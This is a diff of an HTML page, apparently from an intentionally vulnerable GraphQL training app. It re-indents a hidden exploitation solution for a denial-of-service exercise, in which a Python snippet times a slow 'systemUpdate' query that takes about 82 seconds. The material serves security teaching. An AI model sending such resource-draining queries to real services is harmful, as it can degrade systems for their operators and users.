@@ -17,24 +17,23 @@
 <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-intensive')">Show</button></h5>
 <div id="sol-dos-intensive" style="display:none">
   <pre class="bash">
-    # Beginner mode
+# Beginner mode
 
-    # We measure the amount of time it takes a query to finish
-    import time
+# We measure the amount of time it takes a query to finish
+import time
 
-    start = time.time()
-    requests.post('http://host/graphql',
-        json={"query":"query {\n  systemUpdate\n}","variables":[]})
-    end = time.time()
+start = time.time()
+requests.post('http://host/graphql',
+    json={"query":"query {\n  systemUpdate\n}","variables":[]})
+end = time.time()
 
-    print('Execution Time :: {} seconds'.format(end - start))
+print('Execution Time :: {} seconds'.format(end - start))
 
-    # Execution Time :: 81.95908403396606 seconds
+# Execution Time :: 81.95908403396606 seconds
 
 
-    # Expert mode
+# Expert mode
 
-    # A Query Cost Analysis protection is implemented which should prevent bulk system updates!
-  </pre>
+# A Query Cost Analysis protection is implemented which should prevent bulk system updates!</pre>
 </div>
 <!-- End -->
